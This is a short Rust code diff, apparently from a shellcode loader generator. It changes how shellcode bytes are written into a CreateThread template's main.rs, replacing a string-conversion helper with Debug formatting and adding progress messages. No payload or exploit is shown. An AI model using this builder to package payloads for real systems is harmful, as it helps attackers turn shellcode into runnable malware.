@@ -16,23 +16,16 @@ fn search_and_replace(path_to_main: &Path, search: &str, replace: &str) -> Resul
     Ok(())
 }
 
-fn vec_to_string(shellcode: Vec<u8>) -> Result<String, Box<dyn std::error::Error>> {
-    //println!("{:?}", shellcode.clone());
-    let result: String = String::from_utf8(shellcode)?;
-    Ok(result)
-}
-
 pub fn meta_puzzle(order: Order, shellcode: Vec<u8>) {
+    println!("[+] Assembling Rust code..");
     let path_to_main;
     match order.execution {
         Execution::CreateThread => path_to_main = Path::new("templates/createThread/src/main.rs"),
         _ => panic!("Don't even know how this error exists."),
     }
     let search = "{{shellcode}}";
-    let replace: String;
-    match vec_to_string(shellcode) {
-        Ok(content) => replace = content,
-        Err(err) => panic!("{:?}", err),
-    }
+    let replace: String = format!("{:?}", &shellcode);
+
     let _ = search_and_replace(path_to_main, search, &replace);
+    println!("[+] Done assembling Rust code!");
 }
